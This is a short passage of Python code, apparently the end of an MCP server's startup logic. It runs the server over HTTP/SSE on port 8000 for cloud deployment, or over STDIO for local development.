        # Run as HTTP server for cloud deployment
        mcp.run(transport="sse", host="0.0.0.0", port=8000)
    else:
        # Run as STDIO for local development
        mcp.run(transport="stdio")